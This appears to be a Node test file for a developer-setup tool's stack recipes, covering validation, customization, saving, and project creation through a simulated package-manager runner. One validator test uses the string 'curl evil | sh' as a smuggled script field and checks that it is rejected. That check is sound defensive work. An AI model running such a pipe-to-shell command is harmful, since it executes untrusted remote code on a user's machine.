import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  BUILTIN_RECIPES, customizeRecipe, findRecipe, installStack, saveRecipe, validateRecipe,
} from "../src/core/stack.js";
import type { RunResult } from "../src/utils/run.js";
import type { Choice } from "../src/utils/prompt.js";
import { engineCtx, fail, fakeRunner, ok, tempPlatform } from "./helpers.js";

const tmp = (prefix: string) => mkdtempSync(path.join(os.tmpdir(), prefix));
const pkgJson = (dir: string) => JSON.parse(readFileSync(path.join(dir, "package.json"), "utf8"));
const writePkg = (dir: string, data: object) => {
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, "package.json"), JSON.stringify(data));
};

/**
 * A fake PC whose starters and package managers really write files, like the real ones.
 * `log` records every command with the folder it ran in.
 */
function devMachine(installed: string[], opts: { failStarter?: boolean } = {}) {
  const { runner, calls } = fakeRunner({ installed: new Set(installed) });
  const log: { line: string; cwd?: string }[] = [];
  const run = runner.run;
  runner.run = (cmd, args = [], o): RunResult => {
    const line = `${cmd} ${args.join(" ")}`;
    const cwd = o?.cwd;
    if (cmd === "npx" || cmd === "bunx") {
      calls.push(line);
      log.push({ line, cwd });
      if (opts.failStarter) return fail("starter crashed");
      const pkg = args.find((a) => /create-|degit/.test(a))!;
      const name = args[args.indexOf(pkg) + 1] === "solidjs/templates/ts" ? args[args.indexOf(pkg) + 2] : args[args.indexOf(pkg) + 1];
      const deps = pkg.startsWith("create-hono") ? { hono: "^4.0.0" } : pkg.startsWith("create-next-app") ? { next: "^16.0.0" } : {};
      writePkg(path.join(cwd!, name), { name, dependencies: deps });
      // Like the real create-solid template, ship a pnpm lockfile whatever package manager was asked for.
      if (pkg.startsWith("create-solid")) writeFileSync(path.join(cwd!, name, "pnpm-lock.yaml"), "");
      return ok();
    }
    if (["npm", "pnpm", "yarn", "bun"].includes(cmd) && !args.includes("-g")) {
      log.push({ line, cwd });
      if (args[0] === "init") { writePkg(cwd!, { name: path.basename(cwd!) }); return ok(); }
      if (args[0] === "install" && args.length === 1) return ok(); // install the starter's dependencies
      const dev = args.includes("-D") || args.includes("-d");
      const pkgs = args.slice(1).filter((a) => !a.startsWith("-"));
      const data = pkgJson(cwd!);
      const key = dev ? "devDependencies" : "dependencies";
      data[key] = { ...data[key], ...Object.fromEntries(pkgs.map((p) => [p, "^1.0.0"])) };
      writeFileSync(path.join(cwd!, "package.json"), JSON.stringify(data));
      return ok();
    }
    return run(cmd, args, o);
  };
  return { runner, calls, log };
}

const keepAll = async (_m: string, choices: Choice[]) => choices.filter((ch) => ch.checked).map((ch) => ch.value);
const stackCtx = (runner: ReturnType<typeof devMachine>["runner"], extra = {}) =>
  ({ ...engineCtx(runner, tempPlatform("windows")), select: keepAll, ...extra });

// ── Recipes ─────────────────────────────────────────────────

test("every built-in stack only uses real catalog ids and starters", () => {
  assert.deepEqual(BUILTIN_RECIPES.map((r) => r.id), ["next-hono", "solid-hono", "hono-api", "express-prisma"]);
  for (const r of BUILTIN_RECIPES) assert.doesNotThrow(() => validateRecipe(r, r.id), r.id);
});

test("recipe files can't carry anything but ids: unknown fields, ids and starters are refused", () => {
  const base = { id: "x", name: "X", machine: ["node"], libraries: ["hono"] };
  assert.throws(() => validateRecipe({ ...base, script: "curl evil | sh" }), /unknown field\(s\) script/);
  assert.throws(() => validateRecipe({ ...base, libraries: ["left-pad"] }), /unknown library "left-pad"/);
  assert.throws(() => validateRecipe({ ...base, machine: ["hono"] }), /project library: put it under libraries/);
  assert.throws(() => validateRecipe({ ...base, starter: "rails" }), /unknown starter "rails"/);
  assert.throws(() => validateRecipe({ ...base, id: "Bad Id" }), /id must be/);
});

test("customize: swap Drizzle for Prisma", () => {
  const r = customizeRecipe(BUILTIN_RECIPES[0], { without: ["drizzle"], with: ["prisma", "docker"] });
  assert.deepEqual(r.libraries, ["hono", "better-auth", "pg", "prisma"]);
  assert.deepEqual(r.machine, ["node", "postgresql", "docker"], "machine tools land in the machine list");
  assert.throws(() => customizeRecipe(BUILTIN_RECIPES[0], { without: ["kysely"] }), /isn't part of/);
});

test("save a stack, find it by id, share it as a file", () => {
  const platform = tempPlatform("windows");
  const mine = { ...customizeRecipe(BUILTIN_RECIPES[2], { with: ["kysely"] }), id: "my-api", name: "My API" };
  const file = saveRecipe(mine, platform);
  assert.ok(file.endsWith(path.join(".dkit", "stacks", "my-api.json")));
  assert.equal(findRecipe("my-api", platform).source, "saved");
  assert.deepEqual(findRecipe(file, tempPlatform("linux")).libraries, ["hono", "drizzle", "pg", "kysely"], "works as a shared file");
  assert.throws(() => saveRecipe(mine, platform), /--force/);
  assert.throws(() => saveRecipe({ ...mine, id: "next-hono" }, platform), /built-in/);
});

// ── New project ─────────────────────────────────────────────

test("new project: tools first, then the official starter in the parent folder, then libraries inside", async () => {
  const parent = tmp("dkit-parent-");
  const dir = path.join(parent, "my-api");
  const { runner, calls, log } = devMachine(["node"]);
  const report = await installStack(findRecipe("hono-api", tempPlatform("windows")), stackCtx(runner), { projectDir: dir, explicitProject: true });

  const pgInstall = calls.findIndex((c) => c.includes("PostgreSQL.PostgreSQL.17"));
  const starter = calls.findIndex((c) => c.startsWith("npx --yes create-hono@latest my-api"));
  assert.ok(pgInstall >= 0 && starter > pgInstall, "PostgreSQL is installed before the project is created");

  assert.deepEqual(log.map((l) => [l.line, l.cwd]), [
    ["npx --yes create-hono@latest my-api --template nodejs --pm npm --install", parent],
    ["npm install pg drizzle-orm", dir], // hono came with the starter, so it's not added again
    ["npm install -D @types/pg drizzle-kit", dir],
  ]);
  const pkg = pkgJson(dir);
  assert.ok(pkg.dependencies.hono && pkg.dependencies["drizzle-orm"] && pkg.devDependencies["drizzle-kit"]);
  assert.ok(report?.results.some((r) => r.id === "starter:hono" && r.outcome === "installed"));
  assert.ok(report?.notes.some((n) => n.includes(`cd "${dir}"`)));
});

test("each starter's command per package manager", async () => {
  const cases: [string, string, string][] = [
    ["next-hono", "pnpm", "npx --yes create-next-app@latest web --yes --use-pnpm"],
    ["solid-hono", "npm", "npx --yes create-solid@latest web --vanilla --ts --template bare"],
    ["express-prisma", "yarn", "yarn init -y"],
    ["hono-api", "bun", "bunx create-hono@latest web --template bun --pm bun --install"],
  ];
  for (const [id, pm, expected] of cases) {
    const dir = path.join(tmp("dkit-parent-"), "web");
    const { runner, log } = devMachine(["node", "pnpm", "yarn", "bun", "psql"]);
    await installStack(findRecipe(id, tempPlatform("windows")), stackCtx(runner), { projectDir: dir, explicitProject: true, pm: pm as "npm" });
    assert.equal(log[0].line, expected, id);
    assert.ok(existsSync(path.join(dir, "package.json")), `${id}: project created`);
  }
});

test("unchecking a component leaves it out", async () => {
  const dir = path.join(tmp("dkit-parent-"), "app");
  const { runner, calls, log } = devMachine(["node"]);
  const select = async (_m: string, ch: Choice[]) => ch.map((c) => c.value).filter((v) => v !== "postgresql" && v !== "drizzle");
  await installStack(findRecipe("hono-api", tempPlatform("windows")), stackCtx(runner, { select }), { projectDir: dir, explicitProject: true });
  assert.ok(!calls.some((c) => c.includes("PostgreSQL")), "PostgreSQL not installed");
  assert.ok(!log.some((l) => l.line.includes("drizzle")), "Drizzle not added");
});

test("refuses to create a project without --project, or into a folder with files", async () => {
  const { runner } = devMachine(["node"]);
  const recipe = findRecipe("hono-api", tempPlatform("windows"));
  await assert.rejects(installStack(recipe, stackCtx(runner), { projectDir: tmp("dkit-cwd-"), explicitProject: false }), /--project <new-folder>/);
  const busy = tmp("dkit-busy-");
  writeFileSync(path.join(busy, "notes.txt"), "mine");
  await assert.rejects(installStack(recipe, stackCtx(runner), { projectDir: busy, explicitProject: true }), /already has files/);
});

test("if the starter fails, no libraries are added", async () => {
  const dir = path.join(tmp("dkit-parent-"), "app");
  const { runner, log } = devMachine(["node", "psql"], { failStarter: true });
  const report = await installStack(findRecipe("hono-api", tempPlatform("windows")), stackCtx(runner), { projectDir: dir, explicitProject: true });
  assert.equal(log.length, 1, "only the starter ran");
  assert.ok(report?.results.some((r) => r.id === "starter:hono" && r.outcome === "failed"));
});

test("dry run creates nothing", async () => {
  const dir = path.join(tmp("dkit-parent-"), "app");
  const { runner, log, calls } = devMachine([]);
  await installStack(findRecipe("next-hono", tempPlatform("windows")), stackCtx(runner, { dryRun: true }), { projectDir: dir, explicitProject: true });
  assert.equal(log.length, 0);
  assert.ok(!calls.some((c) => c.includes(" install ")));
  assert.ok(!existsSync(dir));
});

// ── Existing project ────────────────────────────────────────

test("inside an existing project: no starter, only what's missing is added", async () => {
  const dir = tmp("dkit-existing-");
  writePkg(dir, { name: "shop", dependencies: { hono: "^4.0.0", kysely: "^0.27.0" } });
  writeFileSync(path.join(dir, "pnpm-lock.yaml"), "");
  const { runner, log } = devMachine(["node", "pnpm", "psql"]);
  await installStack(findRecipe("solid-hono", tempPlatform("windows")), stackCtx(runner), { projectDir: dir, explicitProject: false });
  assert.deepEqual(log.map((l) => l.line), ["pnpm add pg", "pnpm add -D @types/pg dbmate"], "uses the project's pnpm; no starter");
});

test("a starter's lockfile for another package manager is removed", async () => {
  const dir = path.join(tmp("dkit-parent-"), "web");
  const { runner } = devMachine(["node", "psql"]);
  await installStack(findRecipe("solid-hono", tempPlatform("windows")), stackCtx(runner), { projectDir: dir, explicitProject: true });
  assert.ok(!existsSync(path.join(dir, "pnpm-lock.yaml")), "npm project keeps no pnpm lockfile");
});
